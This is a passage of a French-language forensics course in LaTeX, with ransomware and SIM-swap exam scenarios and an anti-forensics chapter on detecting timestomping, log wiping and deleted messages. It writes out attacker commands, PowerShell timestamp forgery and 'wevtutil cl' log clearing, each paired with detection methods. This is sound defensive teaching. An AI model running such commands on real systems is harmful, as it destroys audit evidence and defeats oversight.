          dépend d'un équipement connecté au réseau compromis~;
    \item Le chef du service informatique affirme avoir ``fait
          une sauvegarde hier'', mais ne retrouve pas le support.
\end{itemize}
\end{boxscenario}

\subsection{Décisions critiques sous pression}

\begin{boxexo}[title={\ding{45}\quad SANAGA. Décisions immédiate et médiate}]
\textbf{Vous arrivez sur les lieux à 07h00. Vous avez 10~minutes
pour prendre vos premières décisions.}

\begin{enumerate}[(a)]
    \item \textbf{Triage}~: le patient en soins intensifs est-il
          votre responsabilité en tant qu'investigateur~?
          Que faites-vous en priorité absolue~? Citez le cadre
          éthique (Ch.~13~(UE~SEC4031)~: tension efficacité
          vs droits, ici tension investigation vs vie humaine).
    \item \textbf{Ordre de volatilité}~: le serveur est allumé
          avec le message de rançon visible. Quelle est votre
          séquence d'actions dans les 30~premières minutes~?
          (RFC~3227, Ch.~7~(UE~SEC4031)). Argumentez pourquoi
          la capture RAM précède la capture réseau dans ce contexte.
    \item \textbf{Données de santé}~: 12~000~dossiers patients
          ont potentiellement été exfiltrés. Quelles obligations
          s'appliquent à l'hôpital en vertu de la
          \loicam{2024/017}~? Quels articles~? Dans quels délais~?
          Qui doit en être informé~?
    \item \textbf{La rançon}~: le Directeur de l'hôpital vous
          demande si vous ``conseillez'' de payer la rançon.
          Que répondez-vous~? Justifiez en distinguant le rôle
          de l'investigateur, le rôle du décideur et les
          implications légales du paiement.
    \item \textbf{Investigation post-incident}~:
\begin{lstlisting}[language=bash_forensique]
# Volatility 3 -- windows.pstree (extrait)
4892  4888  WannaCryptor.exe   2026-03-22 04:17:22
  4888 4884  cmd.exe            2026-03-22 04:17:20
    4884 4880  mshta.exe        2026-03-22 04:17:15
      4880 4876  winword.exe    2026-03-22 04:16:58
\end{lstlisting}
          Analysez cette arborescence~: quelle chaîne d'infection
          suggère-t-elle~? Quelle vulnérabilité est probablement
          exploitée~? Rédigez la constatation correspondante.
    \item \textbf{Notification et coopération}~: le message de
          rançon contient une adresse Bitcoin. Tracez la démarche
          complète~: analyse blockchain, identification de l'exchange
          de sortie, demande de gel, juridictions impliquées.
\end{enumerate}
\end{boxexo}

% ============================================================================
\section{Grille d'Erreurs Classiques~: Diagnostiquer une Investigation}
\label{sec:erreurs-classiques}
% ============================================================================

\subsection{L'investigation TANGUE revisitée~: trouver les erreurs}

\begin{boxscenario}{Investigation viciée à corriger}
Voici le procès-verbal d'investigation de l'Opération TANGUE
(version non corrigée). Identifiez toutes les erreurs.

\textit{``Le 14~mars~2026 à 14h30, l'OPJ BITA s'est rendu au
domicile de BELLO Armand et a saisi son PC portable HP. L'OPJ
a allumé le PC pour constater les faits~; l'écran de veille
montrait un dossier nommé ``fraudes''. L'OPJ a photographié
l'écran et a éteint le PC. Le lendemain, l'OPJ a confié le PC
à l'analyste SONG pour analyse~; aucun document de transfer
n'a été rédigé. L'analyste a ouvert l'image forensique avec
Windows Explorer pour naviguer rapidement avant d'ouvrir Autopsy.
Le rapport indique~: ``l'accusé a dissimulé 127 fichiers de
preuves dans un dossier caché~; il est coupable de fraude
informatique selon art.~72.'' Les hash du disque original
sont conservés uniquement dans le fichier E01.''}
\end{boxscenario}

\begin{boxexo}[title={\ding{45}\quad Diagnostic d'investigation viciée}]
\begin{enumerate}[(a)]
    \item Identifiez et nommez toutes les violations de procédure
          (au moins~7). Pour chacune, citez la règle violée
          (Ch.~8~(UE~SEC4031), ACPO~\cite{acpo2012}, ISO~27037~\cite{iso27037}).
    \item Lesquelles de ces violations rendent les preuves
          \textbf{irrecevables} devant un tribunal~? Justifiez.
    \item Lesquelles peuvent être \textbf{régularisées a posteriori}~?
          Comment~?
    \item Réécrivez le paragraphe du rapport en corrigeant les
          erreurs de rédaction (constatation vs analyse,
          qualification juridique par l'expert).
\end{enumerate}
\end{boxexo}

% ============================================================================
\section{Simulation d'Examen Intégrateur}
\label{sec:simulation-examen}
% ============================================================================

\begin{boxalert}
\textbf{Cette section constitue une évaluation formelle.}
Elle est conçue pour être utilisée en conditions d'examen (3~heures)
ou comme devoir maison complet. Toutes les réponses doivent citer
les articles de loi, les standards, les outils et les chapitres
du cours. Aucun document ni outil n'est autorisé en condition examen
sauf indication contraire du formateur.
\end{boxalert}

\begin{boxscenario}{Cas d'examen. Opération DIBAMBA}
\textbf{Contexte~:} Le 5~mai~2026 à 23h45, le SCFC reçoit un
signalement de MTN Cameroun~: des transactions MoMo anormales
touchent 234~clients en 20~minutes. Montant total~: 68~millions~FCFA.

\textbf{Éléments techniques disponibles~:}
\begin{enumerate}
    \item Les transactions proviennent d'un seul numéro MTN
          (677~XXXXXX)~; le titulaire du numéro est EKINDI Paul,
          adresse~: Bonabéri, Douala~;
    \item Ce numéro a subi un SIM~swap à 23h30 (15~minutes avant
          les premières transactions)~;
    \item Le téléphone associé au numéro avant le swap était un
          Samsung Galaxy A32 (IMEI~: 358419XXXXXXXXX)~;
    \item Une capture réseau du réseau GSM (opération d'écoute
          légale, ordonnance N°~XXX) révèle des communications
          DATA depuis l'IMEI 358419XXXXXXXXX vers l'IP
          \texttt{41.66.XX.XX} (hébergeur OVH Paris) sur le
          port~8443 à 23h31~;
    \item L'adresse IP \texttt{41.66.XX.XX} héberge un domaine
          enregistré le 29~avril~2026~: \texttt{mtn-verification.cm}.
\end{enumerate}

\textbf{Contraintes~:}
\begin{itemize}
    \item Il est 01h00 du matin~; les opérateurs humains sont limités~;
    \item MTN Cameroun a conservé les logs de la transaction
          SIM~swap pendant 90~jours~;
    \item Le parquet de permanence peut délivrer une réquisition
          d'urgence~;
    \item Vous disposez de 2~heures avant que les logs de connexion
          de l'hébergeur OVH ne risquent d'être en rotation.
\end{itemize}
\end{boxscenario}

\begin{boxexo}[title={\ding{45}\quad Examen. Opération DIBAMBA (3 heures)}]
\textbf{Partie~A. Cadrage et urgences (45 minutes)}

\begin{enumerate}[(a)]
    \item Remplissez la matrice de criticité. Quel niveau de rigueur~?
    \item Listez 3~actions d'urgence (dans l'ordre) à réaliser
          dans les 30~premières minutes, avec base légale pour chacune.
    \item Rédigez la demande de conservation urgente à OVH (portail
          LEA, art.~29 Budapest / art.~57 \loicam{2010/012}).
          La France est partie à Budapest depuis 2006.
\end{enumerate}

\textbf{Partie~B. Analyse technique (60 minutes)}

\begin{enumerate}[(a)]
    \setcounter{enumi}{3}
    \item Le SIM~swap s'est produit à 23h30. Comment cela permet-il
          à l'attaquant d'accéder aux comptes MoMo de 234~victimes~?
          Expliquez le mécanisme technique (OTP par SMS).
    \item La capture réseau montre une connexion vers le port~8443
          sur \texttt{mtn-verification.cm} (domaine enregistré
          le 29~avril). Que peut contenir cette connexion~?
          Quels filtres Wireshark utilisez-vous~?
    \item L'analyse OSINT du domaine \texttt{mtn-verification.cm}
          révèle~: registrar américain, paiement en Bitcoin,
          hébergement OVH Paris. Quelle séquence de réquisitions
          préparez-vous~?
\end{enumerate}

\textbf{Partie~C. Qualification et rapport (75 minutes)}

\begin{enumerate}[(a)]
    \setcounter{enumi}{6}
    \item Qualifiez toutes les infractions potentielles~: pour chaque
          infraction, citez l'article exact (\loicam{2010/012},
          \loicam{2024/017}, Code pénal). Y a-t-il des infractions
          à la charge de MTN Cameroun pour la gestion du SIM~swap~?
    \item Formulez 5~constatations et 2~analyses (avec niveau de
          confiance) à partir des éléments disponibles.
    \item Rédigez la Synthèse Exécutive (Niveau~1) destinée
          au Procureur de permanence~: 1~page maximum,
          3~points, une pièce clé.
    \item \textbf{[Question bonus]} Appliquez la grille CRO à la
          décision de publier l'IP~\texttt{41.66.XX.XX} dans un
          communiqué de presse avant l'arrestation~: quelles
          tensions~? Quelle recommandation~?
\end{enumerate}
\end{boxexo}

\separateur

% --- Encadré lab NDAP SUKULU ---
\begin{boiteRemarque}{Le laboratoire de synthèse INA-LAB-12}
Le dernier laboratoire de NDAP SUKULU, le plus long (trois heures), reprend
l'opération DIBAMBA de la simulation d'examen et résume tout le cours en sept
parties~:
\begin{itemize}
    \item \textbf{A. Chronologie} (ch.~14, 16)~: croiser le journal des
          changements de SIM de l'opérateur et les transactions Mobile Money
          (délai, montant total, agent).
    \item \textbf{B. Réseau et OSINT} (ch.~15, 19)~: flux de l'écoute légale,
          WHOIS (date d'enregistrement du domaine), DNS passif (domaines qui
          partagent une adresse).
    \item \textbf{C. Coopération} (UE~SEC4031, ch.~10)~: conservation urgente
          par le réseau 24/7 avant la rotation des journaux, puis entraide.
    \item \textbf{D. Erreurs} (ch.~20 et section~21.4)~: le procès-verbal TANGUE
          à corriger.
    \item \textbf{E. Benchmarking} (ch.~25)~: le modèle du ciblage et les
          recommandations pour le Cameroun.
    \item \textbf{F. Crypto-forensique} (ch.~26 à~28)~: quelles preuves
          archivées perdent leur garantie face à Shor (signatures et horodatages
          RSA ou ECDSA)~; mesures CLO~: $\mathsf{Opp}=I(V;\Sigma\mid C)/H(V\mid C)$,
          produit $\mathsf{Conf}\cdot\mathsf{Rel}\cdot\mathsf{Opp}$, capacité
          implicite $\Delta \gtrsim$ produit~$\times\,\lambda$, borne
          $\min\{1, H(C)/H(V\mid C)\}$.
    \item \textbf{G. Lecture critique} (ch.~29 à~32)~: la grille d'une annonce de
          protocole, l'étape d'analyse automatisée (Tamarin, ProVerif), la
          signature BLS face au quantique.
\end{itemize}
\end{boiteRemarque}

\begin{boxresume}
\textbf{Ce que ce chapitre vous a demandé de mobiliser simultanément~:}
\begin{itemize}
    \item \textbf{Droit camerounais}~: qualification précise des
          infractions (\loicam{2010/012}, \loicam{2024/017},
          Code pénal), règles d'articulation, sursis impossible
          (art.~89).

    \item \textbf{PIU}~: les phases E1--E17, les Quality Gates,
          la boucle itérative, la falsification active (E9bis),
          la distinction constatation/analyse.

    \item \textbf{Standards}~: RFC~3227 (ordre de volatilité),
          ISO~27037 (custody), ACPO~4~principes, NIST~SP~800-86~\cite{nist80086}
          (rapport).

    \item \textbf{Techniques}~: Event~ID Windows, logs SSH, Volatility
          (pstree, netscan), analyse portail LEA, conservation urgente
          art.~29 Budapest, analyse blockchain, corrélation temporelle.

    \item \textbf{Déontologie}~: tension efficacité vs vie humaine
          (SANAGA), pression politique (MUNGO), coverage d'un
          collègue (TANGUE).

    \item \textbf{Rapport}~: trois niveaux, 7~pièges, Annexe~G,
          formule de limitation de périmètre, qualification
          technique sans qualification juridique.
\end{itemize}

\textbf{Les trois leçons transversales de ce chapitre~:}
\begin{enumerate}
    \item \textbf{La conservation d'urgence prime toujours~:}
          dans FAKO, MUNGO, SANAGA et DIBAMBA, la première
          action est toujours de préserver avant que les données
          disparaissent. Aucune analyse ne compense des données
          perdues.
    \item \textbf{Les décisions techniques ont des conséquences
          déontologiques~:} le choix d'éteindre ou non un serveur
          (SANAGA) engage une responsabilité éthique au-delà de
          la technique.
    \item \textbf{Un rapport sans hash n'existe pas juridiquement~:}
          l'Annexe~G est la fondation de toute opposabilité.
          Sans elle, toutes vos analyses sont des opinions,
          pas des preuves.
\end{enumerate}
\end{boxresume}

\bigskip

\begin{boxinfo}
\textbf{Fin de la Partie~IV.} Les vingt chapitres couverts dans
ce cours (Parties~I à~IV) constituent le socle complet de la
forensique numérique au niveau master~: fondements philosophiques,
processus, standards, droit camerounais, techniques d'acquisition
et d'analyse (système, réseau, mobile, cloud, IoT), rédaction
de rapport et intégration par la pratique.

La \textbf{Partie~V}. si elle est incluse dans votre programme, approfondit les sujets prospectifs~: OSINT avancé,
anti-forensique et contre-mesures, intelligence artificielle
appliquée à la forensique, et perspectives post-quantiques.
Ces chapitres s'inscrivent dans la continuité directe des
techniques maîtrisées ici.

\textit{Les affaires de ce cours (MBONGO, MVOM, WOURI,
ONAMBELE, BAOBAB, TANGUE, MOABI, ROUSSEAU, et les nouveaux
cas FAKO, MUNGO, SANAGA, DIBAMBA) sont fictives mais
construites sur des schémas d'infractions réels. Chaque
technique, chaque article de loi, chaque outil présenté est
authentique et applicable dès demain sur le terrain.}
\end{boxinfo}

     

    % ======================================================================
    % PARTIE V - ANTI-FORENSIQUE, IA ET DÉFIS ÉMERGENTS
    % Standards : SANS FOR610, MITRE ATT&CK, DFRWS 2024
    % Niveau : expert
    % ======================================================================
    \part{Anti-Forensique, IA Forensique et Défis Émergents}
    \label{part:avance}

        % ============================================================================
% Fichier  : partie5/P05_C22_anti_forensique.tex
% Titre    : Anti-Forensique et Contremesures
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 1.0 -- Juin 2026
% ============================================================================

\chapter{Anti-Forensique et Contremesures}
\label{chap:anti-for}

\epigraph{%
    « L'absence de preuve est elle-même une preuve à condition
    de savoir où et comment cette absence a été créée. »%
}{Thierry Minka}

\niveauChapitre{Expert}{%
    Maîtrise complète de la Partie~IV (Ch.~\ref{chap:for-sys}
    à~\ref{chap:rapport}) indispensable. Ce chapitre suppose la
    connaissance des artefacts normaux pour en détecter l'absence
    anormale.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Comprendre la logique de l'anti-forensique~: pourquoi
          l'effacement parfait est techniquement très difficile.
    \item Identifier les techniques d'anti-forensique système~:
          timestomping, suppression sélective de logs, wiping.
    \item Détecter les tentatives d'anti-forensique réseau~:
          désactivation de logging, usurpation, chiffrement opportuniste.
    \item Reconnaître les techniques anti-forensique mobile et IoT~:
          factory reset, suppression d'historique, applications vault.
    \item Appliquer le principe de Locard~\cite{locard1920} inversé~: toute tentative
          d'effacement laisse elle-même une trace.
    \item Documenter une tentative d'anti-forensique dans le rapport
          forensique de façon juridiquement opposable.
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section*{La logique de l'anti-forensique}
% ============================================================================

Tout au long des Chapitres~\ref{chap:for-sys} à~\ref{chap:for-iot},
plusieurs scénarios ont montré des attaquants tentant d'effacer leurs
traces~: suppression du script \texttt{enc\_all.ps1} dans l'affaire MVOM
(Ch.~\ref{chap:for-sys}), \texttt{StopLogging} sur CloudTrail
(Ch.~\ref{chap:for-cloud}), tentatives de \textit{factory reset}
sur des appareils IoT (Ch.~\ref{chap:for-iot}). Dans chaque cas,
\textbf{la tentative a échoué à effacer toutes les traces}.

Ce n'est pas un hasard pédagogique~: c'est une réalité technique.
La redondance forensique (Ch.~\ref{chap:for-sys}, Tableau~14.1)
signifie qu'effacer \emph{toutes} les traces d'une action exige
de connaître et neutraliser \emph{chaque} artefact qu'elle a produit, une tâche d'une difficulté croissante avec la sophistication
des systèmes modernes.

\separateur

% ============================================================================
\section{Principes Généraux de l'Anti-Forensique}
\label{sec:principes-anti-for}
% ============================================================================

\subsection{Taxonomie des techniques anti-forensiques}

\begin{tableaucours}{p{3.0cm}p{3.5cm}p{5.0cm}}{%
    \tableauHeader{Catégorie} &
    \tableauHeader{Objectif} &
    \tableauHeader{Exemples}
}
\textbf{Destruction} & Éliminer la preuve définitivement &
    Wiping disque, suppression sécurisée, factory reset, destruction
    physique \\
\textbf{Obfuscation} & Rendre la preuve illisible ou non identifiable &
    Chiffrement, packing de malware, stéganographie, encodage \\
\textbf{Falsification} & Modifier la preuve pour induire en erreur &
    Timestomping, usurpation d'identité réseau, faux logs \\
\textbf{Minimisation} & Réduire la quantité de preuves produites &
    Désactivation de logging, mode furtif, utilisation de RAM uniquement \\
\textbf{Diversion} & Détourner l'attention de l'investigateur &
    False flag (faire accuser un tiers), bruit de fond généré
    artificiellement \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~22.1. Taxonomie des techniques anti-forensiques}\end{center}

\subsection{Le principe de Locard inversé}

\begin{boxdef}
\textbf{Principe de Locard inversé}\index{Locard inversé}~:
toute tentative d'effacement ou de modification d'une preuve produit
elle-même de nouvelles traces. L'acte de suppression est lui-même
un événement système qui laisse des artefacts, souvent dans des
emplacements que l'attaquant ne maîtrise pas ou ignore.
\end{boxdef}

Ce principe explique pourquoi, dans l'affaire MVOM, la suppression du
script \texttt{enc\_all.ps1} (Ch.~\ref{chap:for-sys}) a elle-même été
enregistrée dans le \texttt{\$UsnJrnl} avec horodatage précis~: l'acte
de \texttt{FileDelete} est un événement journalisé au même titre
que \texttt{FileCreate}.

\begin{boxCRO}
\textbf{Analyse CRO. L'asymétrie fondamentale de l'anti-forensique}

$\mathcal{R}$ (côté attaquant)~: pour effacer parfaitement une trace,
l'attaquant doit connaître \emph{tous} les artefacts qu'elle a générés, une connaissance rarement complète, même pour un attaquant
sophistiqué.

$\mathcal{R}$ (côté investigateur)~: il suffit qu'\emph{un seul}
artefact survive parmi les nombreux générés (redondance forensique)
pour révéler l'activité initiale ET la tentative d'effacement.

$\mathcal{O}$~: une tentative d'effacement détectée renforce
paradoxalement l'opposabilité du dossier~: elle démontre l'intention
(\textit{mens rea}) de dissimuler une activité, un élément
souvent utile à la qualification pénale.

\cro{$\sim$}{$\downarrow$ pour l'attaquant~; $\uparrow\uparrow$ pour l'investigateur}{$\uparrow$ preuve d'intention}

\textbf{Conclusion~:} l'asymétrie structurelle favorise l'investigateur.
La sophistication nécessaire pour un effacement parfait dépasse les
moyens de la grande majorité des attaquants, y compris sophistiqués.
\end{boxCRO}

% ============================================================================
\section{Anti-Forensique Système~: Détection des Tentatives}
\label{sec:anti-for-systeme}
% ============================================================================

\subsection{Timestomping~: manipulation des horodatages}

Le Chapitre~\ref{chap:for-sys} a introduit le timestomping et sa
détection par croisement \texttt{\$MFT}/\texttt{\$UsnJrnl}. Ce chapitre
approfondit les techniques et leurs limites.

\begin{boxoutils}{Outils de timestomping et leurs limites}
\begin{lstlisting}[language=bash_forensique]
# Outils couramment utilises par les attaquants :
# - timestomp.exe (Metasploit)
# - SetMACE
# - PowerShell natif :
Set-ItemProperty -Path "C:\malware.exe" -Name CreationTime `
    -Value "2020-01-01 00:00:00"
Set-ItemProperty -Path "C:\malware.exe" -Name LastWriteTime `
    -Value "2020-01-01 00:00:00"

# CE QUE CES OUTILS NE PEUVENT PAS MODIFIER :
# 1. Le $UsnJrnl -- enregistre l'evenement de modification
#    des timestamps lui-meme (USN_REASON_BASIC_INFO_CHANGE)
MFTECmd.exe -f \$UsnJrnl:\$J --csv ./output/
# Chercher : Reason contient "BasicInfoChange"
# Cet evenement EST la preuve du timestomping

# 2. Le $LogFile (journal de transactions NTFS)
# Contient l'historique des transactions, y compris les
# modifications de timestamps, sur une fenetre plus courte
# (quelques heures a quelques jours selon l'activite disque)
LogFileParser.exe -f \$LogFile --csv ./output/logfile.csv

# 3. Les artefacts independants (Prefetch, UserAssist, ShimCache)
# ne sont PAS synchronises avec les modifications du $MFT
# -- ils gardent leurs propres horodatages independants
\end{lstlisting}
\end{boxoutils}

\begin{boxscenario}{Détection de timestomping, méthode systématique}
\textbf{Étape~1~:} comparer les 4~horodatages MACE d'un fichier suspect.
Une cohérence parfaite (les~4~identiques à la seconde près) est
elle-même suspecte, un fichier créé normalement présente rarement
4~horodatages strictement identiques.

\textbf{Étape~2~:} croiser avec le \texttt{\$UsnJrnl}. Si le
\texttt{\$UsnJrnl} contient un événement \texttt{FileCreate} à une
date différente de celle affichée dans le \texttt{\$MFT}, c'est
une preuve directe de manipulation.

\textbf{Étape~3~:} croiser avec les artefacts indépendants
(Prefetch, UserAssist). Si Prefetch enregistre une exécution à
une date que le \texttt{\$MFT} affiche comme antérieure à la
création du fichier, c'est une incohérence logique irréfutable.

\textbf{Constatation type~:}
``Le \texttt{\$MFT} affiche pour le fichier \texttt{rootkit.dll}
une date de création du 12/08/2019. Le \texttt{\$UsnJrnl} enregistre
un événement \texttt{FileCreate} pour ce même fichier le 13/03/2026
à 02h19:15, soit 6~ans et 7~mois après la date affichée par le
\texttt{\$MFT}. Cette divergence constitue une preuve technique
de modification des horodatages (timestomping).''
\end{boxscenario}

\subsection{Suppression sélective de logs}

\begin{boxoutils}{Techniques de suppression de logs Windows et détection}
\begin{lstlisting}[language=bash_forensique]
# Technique attaquant : effacer le journal des evenements
wevtutil cl Security
wevtutil cl System
# Efface TOUT le journal -- action elle-meme detectable

# DETECTION : l'effacement génère un evenement
# Event ID 1102 : "The audit log was cleared"
# Cet evenement EST enregistre dans le journal Security
# AVANT que celui-ci soit vide, OU dans le journal qui suit

# Recherche de l'Event ID 1102 (preuve d'effacement de logs)
wevtutil qe Security /q:"*[System[(EventID=1102)]]" /f:text

# Technique plus sophistiquee : suppression selective d'evenements
# (modification directe du fichier .evtx)
# DETECTION : comparer le nombre d'evenements attendu
# (frequence normale) avec le nombre observe -- un "trou"
# dans la sequence des Event ID est suspect

# Verifier la continuite des RecordNumber (numero sequentiel)
# Si RecordNumber saute de 4521 a 4598, 76 evenements manquent
Get-WinEvent -Path security.evtx |
    Select-Object RecordId, TimeCreated, Id |
    Sort-Object RecordId
\end{lstlisting}
\end{boxoutils}

\begin{boxalert}
\textbf{L'Event~ID~1102~: la signature universelle de l'effacement Windows}

\texttt{wevtutil cl} (\textit{clear log}) est la commande la plus
utilisée par les attaquants pour effacer leurs traces. Elle génère
\emph{systématiquement} l'Event~ID~1102 (``Le journal d'audit a été
effacé''), qui survit à l'effacement lui-même car il est écrit
\emph{après} l'opération de nettoyage. \textbf{Chercher l'Event~ID~1102
doit être un réflexe systématique} dans toute investigation Windows
suspectant une dissimulation.
\end{boxalert}

\subsection{Wiping et suppression sécurisée}

\begin{boxoutils}{Détection de wiping de fichiers}
\begin{lstlisting}[language=bash_forensique]
# Outils de wiping courants : sdelete (Sysinternals), CCleaner,
# Eraser -- ecrivent des donnees aleatoires sur l'espace libere

# DETECTION 1 : signature de sdelete dans le $MFT
# sdelete renomme le fichier en une chaine de caracteres avant
# suppression -- cette sequence de renommages est visible dans
# le $UsnJrnl
MFTECmd.exe -f \$UsnJrnl:\$J --csv ./output/ |
    grep -E "RenameOldName|RenameNewName"
# Plusieurs renommages successifs rapides = signature sdelete

# DETECTION 2 : entropie de l'espace libere
# Wiping remplit l'espace de donnees aleatoires (haute entropie)
# Espace libere normalement (juste marque disponible) garde
# le contenu original jusqu'a reecriture -- entropie variable
photorec /d /output/ -cmd /dev/sdb1 freespace
# Analyser l'entropie de l'espace libere :
ent /output/freespace_dump.bin
# Entropie proche de 8.0 bits/byte sur de larges plages = wiping

# DETECTION 3 : logs d'execution de l'outil de wiping lui-meme
# (ironie : l'outil de suppression de preuves laisse ses propres
# traces -- Prefetch, UserAssist, ShimCache pour sdelete.exe)
PECmd.exe -f SDELETE.EXE-XXXXXXXX.pf
\end{lstlisting}
\end{boxoutils}

% ============================================================================
\section{Anti-Forensique Réseau~: Désactivation et Camouflage}
\label{sec:anti-for-reseau}
% ============================================================================

\subsection{Désactivation de logging~: le cas CloudTrail}

Le Chapitre~\ref{chap:for-cloud} a présenté la tentative
\texttt{StopLogging} dans l'affaire MVOM. Ce mécanisme se généralise~:

\begin{tableaucours}{p{3.0cm}p{4.0cm}p{4.5cm}}{%
    \tableauHeader{Plateforme} &
    \tableauHeader{Action de désactivation} &
    \tableauHeader{Contre-mesure architecturale}
}
AWS CloudTrail & \texttt{StopLogging}, \texttt{DeleteTrail} &
    Object Lock (WORM) sur le bucket~S3~; alerte CloudWatch
    sur ces actions \\
Azure Activity Log & Désactivation via portail (rare, nécessite
    droits élevés) & Logs exportés vers Log~Analytics
    (rétention indépendante) \\
Logs Windows & \texttt{wevtutil cl} &
    Forwarding vers serveur Syslog centralisé (SIEM) en temps réel \\
journald (Linux) & \texttt{journalctl --vacuum-time} &
    Forwarding rsyslog vers serveur distant~; \texttt{Storage=persistent} \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~22.2. Désactivation de logging et contre-mesures}\end{center}

\begin{boiteRemarque}{Le principe du forwarding~: la meilleure défense}
La contre-mesure la plus efficace contre toute désactivation de
logging \emph{locale} est le \textbf{forwarding en temps réel} vers
un système distant que l'attaquant ne contrôle pas. Un attaquant
qui compromet un serveur et désactive ses logs locaux ne peut pas
effacer ce qui a déjà été transmis ailleurs. Cette architecture
(SIEM centralisé) devrait être recommandée dans toute mission de
sécurisation post-incident.
\end{boiteRemarque}

\subsection{Chiffrement opportuniste et tunneling}

\begin{boxoutils}{Détection de canaux chiffrés non identifiés}
\begin{lstlisting}[language=bash_forensique]
# L'attaquant chiffre son C2 pour eviter l'inspection du contenu
# (vu en Ch. 15 : tunneling DNS, HTTPS legitime detourne)

# Detection par metadonnees (meme si contenu illisible) :
# 1. Certificat TLS auto-signe ou recent
tshark -r capture.pcap -Y "tls.handshake.type == 11" \
    -T fields -e tls.handshake.certificate
# Verifier la date d'emission du certificat -- recent = suspect

# 2. JA3/JA3S fingerprinting (signature du client TLS)
# Outil : ja3 (python)
python3 ja3.py capture.pcap
# Comparer avec des bases de signatures malveillantes connues
# (ja3er.com, abuse.ch SSL Blacklist)

# 3. Pattern de connexion meme sans dechiffrement
# (beaconing -- vu en Ch. 15 -- fonctionne meme sur trafic chiffre,
# car les METADONNEES de connexion restent visibles)
\end{lstlisting}
\end{boxoutils}

% ============================================================================
\section{Anti-Forensique Mobile et IoT}
\label{sec:anti-for-mobile-iot}
% ============================================================================

\subsection{Factory reset~: ce qui survit réellement}

Le Chapitre~\ref{chap:for-iot} a introduit la limite du factory reset.
Cette section approfondit, avec application au mobile (Ch.~\ref{chap:for-mob}).

\begin{tableaucours}{p{3.2cm}p{4.0cm}p{4.5cm}}{%
    \tableauHeader{Données} &
    \tableauHeader{Effacées par factory reset~?} &
    \tableauHeader{Source de récupération}
}
Stockage interne (\texttt{/data}) & Oui (en général) &
    Carving sur l'espace non réécrit (extraction physique avant
    réécriture complète) \\
Carte SD externe & \textbf{Non} (sauf reformatage explicite) &
    Extraction directe de la SD \\
Logs opérateur (appels, SMS, data) & Non (jamais sur l'appareil) &
    Réquisition opérateur (art.~57 Loi~2010) \\
Données cloud synchronisées
    (avant le reset) & Non &
    Réquisition fournisseur (Google, iCloud) \\
Historique réseau opérateur
    (cellules GSM) & Non &
    Réquisition + analyse Cell~ID (Ch.~\ref{chap:for-mob}) \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~22.3. Factory reset~: ce qui est réellement effacé}\end{center}

\subsection{Applications ``vault'' et conteneurs cachés}

\begin{boxalert}
\textbf{Applications vault~: dissimulation par camouflage}

Les applications de type ``vault'' (\textit{Calculator+},
\textit{Vault -- Hide Photos}) se présentent sous l'apparence
d'une application anodine (calculatrice) mais cachent un conteneur
chiffré accessible par un code secret.

\textbf{Détection~:}
\begin{itemize}
    \item \texttt{adb shell pm list packages -f} révèle le nom de
          package réel, souvent différent du nom affiché
          (ex.~: \texttt{com.vault.hideit} pour une icône
          ``Calculatrice'')~;
    \item Analyse de la taille du stockage de l'application
          (\texttt{adb shell dumpsys package <package>}) -- une
          calculatrice de 200~Mo est suspecte~;
    \item Liste des permissions demandées (accès photos, stockage)
          incohérente avec la fonction affichée.
\end{itemize}
\end{boxalert}

\subsection{Suppression sélective WhatsApp/Telegram}

\begin{boxoutils}{Détection de suppression de conversations}
\begin{lstlisting}[language=bash_forensique]
-- Sur msgstore.db (WhatsApp, Ch. 16), verifier les "trous"
-- dans la sequence des _id (cles primaires auto-incrementees)
SELECT _id, timestamp FROM messages ORDER BY _id;
-- Si _id saute de 1847 a 1901, 53 messages ont ete supprimes

-- WhatsApp conserve des backups automatiques quotidiens
-- (msgstore-YYYY-MM-DD.1.db.crypt15) sur 7 jours par defaut
-- Comparer le backup de la veille avec la base actuelle :
-- les messages presents dans le backup mais absents de la base
-- actuelle ont ete supprimes par l'utilisateur

-- Telegram (cache local, moins de retention) :
-- chercher les fichiers cache/ supprimes via carving
-- (Ch. 9 -- foremost/scalpel) sur l'extraction du telephone
\end{lstlisting}
\end{boxoutils}

% ============================================================================
\section{Documenter une Tentative d'Anti-Forensique dans le Rapport}
\label{sec:documentation-anti-for}
% ============================================================================

La détection d'une tentative d'anti-forensique doit être documentée
selon les mêmes règles que toute autre constatation
(Ch.~\ref{chap:rapport}), avec une attention particulière car
elle constitue souvent un élément d'intention (\textit{mens rea}).

\begin{lstlisting}[language=bash_forensique,
    caption={Exemple de constatation et analyse, tentative d'anti-forensique}]
CONSTATATIONS (anti-forensique) :

C.10 : Le journal des événements Security du serveur enregistre
       un événement Event ID 1102 ("Le journal d'audit a été
       effacé") à 02h19:48, par le compte "admin".
       [Source : wevtutil, Annexe H]

C.11 : Le $UsnJrnl enregistre la suppression du fichier
       "enc_all.ps1" à 02h18:30, 1 minute et 18 secondes avant
       l'effacement du journal Security (C.10).
       [Source : MFTECmd, Annexe B]

ANALYSE :

La séquence temporelle C.10-C.11 est cohérente, avec un niveau
de confiance élevé, avec une tentative de dissimulation des
traces de l'intrusion par l'auteur de l'attaque. Cette tentative
n'a cependant pas atteint son objectif : le $UsnJrnl, distinct
du journal des événements Security, conserve l'historique complet
des opérations sur le système de fichiers, incluant la création
et la suppression du script malveillant.

Hypothèse alternative envisagée et écartée : une maintenance
système légitime aurait pu causer cet effacement de logs.
Cette hypothèse est écartée car (1) aucune fenêtre de maintenance
n'était planifiée à cette date selon les procédures de
l'entreprise (Annexe E) et (2) la proximité temporelle immédiate
avec la suppression du fichier malveillant (78 secondes) rend
cette coïncidence hautement improbable.
\end{lstlisting}

\begin{boxjuris}
\textbf{Valeur juridique de la tentative d'anti-forensique}

En droit camerounais, la tentative de dissimulation de preuves
peut constituer un élément aggravant ou un indice de l'intention
coupable. L'art.~88 \loicam{2010/012}~\cite{cameroun2010a} (refus de remise de clé de
déchiffrement, Ch.~12~(UE~SEC4031)) illustre ce principe~:
le législateur sanctionne spécifiquement les comportements
d'obstruction à l'investigation. La documentation rigoureuse
d'une tentative d'effacement (avec ses propres constatations
et sources) renforce la valeur probatoire du dossier dans
son ensemble.
\end{boxjuris}

\separateur

% --- Encadré lab NDAP SUKULU ---
